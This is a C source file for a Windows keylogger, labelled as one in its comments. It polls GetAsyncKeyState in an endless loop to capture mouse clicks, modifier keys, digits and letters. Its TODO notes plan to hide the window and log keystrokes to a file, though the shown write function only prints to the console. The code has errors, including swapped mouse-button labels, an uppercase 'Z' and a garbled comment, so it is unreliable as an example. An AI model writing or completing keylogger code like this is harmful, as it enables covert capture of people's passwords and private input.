#include <stdio.h>
#include <windows.h>
#include <winuser.h>
//NOTE: This is a key logger program that takes all keyboard input and writes that information to a file
//TODO: steps for program 
// 1. Make sure the window is hidden
// 2. Create an infinite loop
// 3. in each iteration of the loop check each key code after calling GetAsyncKeyState
// 4. check whether that key code was just pressed and is being held
// 5.a write that key to file
// 5.b only write to file each break in input, meaning if getasynckeystate returns false for all keys
//INFO: program will consist of 3 functonGetAsyncKeyState(VK_LBUTTON)s
// 1. main for the main loop
// 2. write function to handle writing the proper char to the file
// 3. check for a break in input (maybe)


void write_to_file(char *str){
  //FIX: something wrong when writing to file, did not properly picked what was being typed 
  // in the same way it does when simply printing to stdout
  //NOTE: do not write each if statement, append to buffer and write to file on a timer
  printf("%s", str);
}
int main(){

  while(1){
    if(GetAsyncKeyState(VK_LBUTTON) & 0x0001) write_to_file((char *)"[RIGHT_MOUSE]");
    if(GetAsyncKeyState(VK_RBUTTON) & 0x0001) write_to_file((char *)"[LEFT_MOUSE]");
    if(GetAsyncKeyState(VK_BACK) & 0x0001) write_to_file((char *)"[enable del functionality]");
    if(GetAsyncKeyState(VK_TAB) & 0x0001) write_to_file((char *)"\t");
    if(GetAsyncKeyState(VK_RETURN) & 0x0001) write_to_file((char *)"\n");
    if(GetAsyncKeyState(VK_SHIFT) & 0x0001) write_to_file((char *)"[shift functionality]");
    if(GetAsyncKeyState(VK_CONTROL) & 0x0001) write_to_file((char *)"[ctrl functionality]");
    if(GetAsyncKeyState(VK_MENU) & 0x0001) write_to_file((char *)"[menu/alt functionality]");
    if(GetAsyncKeyState(VK_CAPITAL) & 0x0001) write_to_file((char *)"[caps functionality]");
    if(GetAsyncKeyState(VK_SPACE) & 0x0001) write_to_file((char *)" ");
    if(GetAsyncKeyState(VK_HOME) & 0x0001) write_to_file((char *)"[WND]");
    if(GetAsyncKeyState(VK_PRINT) & 0x0001) write_to_file((char *)"[PRINT]");
    if(GetAsyncKeyState(VK_SNAPSHOT) & 0x0001) write_to_file((char *)"[PRINT_PAGE]");
    if(GetAsyncKeyState(VK_DELETE) & 0x0001) write_to_file((char *)"delete functionality");
    if(GetAsyncKeyState('0') & 0x0001) write_to_file((char *)"0");
    if(GetAsyncKeyState('1') & 0x0001) write_to_file((char *)"1");
    if(GetAsyncKeyState('2') & 0x0001) write_to_file((char *)"2");
    if(GetAsyncKeyState('3') & 0x0001) write_to_file((char *)"3");
    if(GetAsyncKeyState('4') & 0x0001) write_to_file((char *)"4");
    if(GetAsyncKeyState('5') & 0x0001) write_to_file((char *)"5");
    if(GetAsyncKeyState('6') & 0x0001) write_to_file((char *)"6");
    if(GetAsyncKeyState('7') & 0x0001) write_to_file((char *)"7");
    if(GetAsyncKeyState('8') & 0x0001) write_to_file((char *)"8");
    if(GetAsyncKeyState('9') & 0x0001) write_to_file((char *)"9");
    if(GetAsyncKeyState('A') & 0x0001) write_to_file((char *)"a");
    if(GetAsyncKeyState('B') & 0x0001) write_to_file((char *)"b");
    if(GetAsyncKeyState('C') & 0x0001) write_to_file((char *)"c");
    if(GetAsyncKeyState('D') & 0x0001) write_to_file((char *)"d");
    if(GetAsyncKeyState('E') & 0x0001) write_to_file((char *)"e");
    if(GetAsyncKeyState('F') & 0x0001) write_to_file((char *)"f");
    if(GetAsyncKeyState('G') & 0x0001) write_to_file((char *)"g");
    if(GetAsyncKeyState('H') & 0x0001) write_to_file((char *)"h");
    if(GetAsyncKeyState('I') & 0x0001) write_to_file((char *)"i");
    if(GetAsyncKeyState('J') & 0x0001) write_to_file((char *)"j");
    if(GetAsyncKeyState('K') & 0x0001) write_to_file((char *)"k");
    if(GetAsyncKeyState('L') & 0x0001) write_to_file((char *)"l");
    if(GetAsyncKeyState('M') & 0x0001) write_to_file((char *)"m");
    if(GetAsyncKeyState('N') & 0x0001) write_to_file((char *)"n");
    if(GetAsyncKeyState('O') & 0x0001) write_to_file((char *)"o");
    if(GetAsyncKeyState('P') & 0x0001) write_to_file((char *)"p");
    if(GetAsyncKeyState('Q') & 0x0001) write_to_file((char *)"q");
    if(GetAsyncKeyState('R') & 0x0001) write_to_file((char *)"r");
    if(GetAsyncKeyState('S') & 0x0001) write_to_file((char *)"s");
    if(GetAsyncKeyState('T') & 0x0001) write_to_file((char *)"t");
    if(GetAsyncKeyState('U') & 0x0001) write_to_file((char *)"u");
    if(GetAsyncKeyState('V') & 0x0001) write_to_file((char *)"v");
    if(GetAsyncKeyState('W') & 0x0001) write_to_file((char *)"w");
    if(GetAsyncKeyState('X') & 0x0001) write_to_file((char *)"x");
    if(GetAsyncKeyState('Y') & 0x0001) write_to_file((char *)"y");
    if(GetAsyncKeyState('Z') & 0x0001) write_to_file((char *)"Z");
  }
  return 0;
}
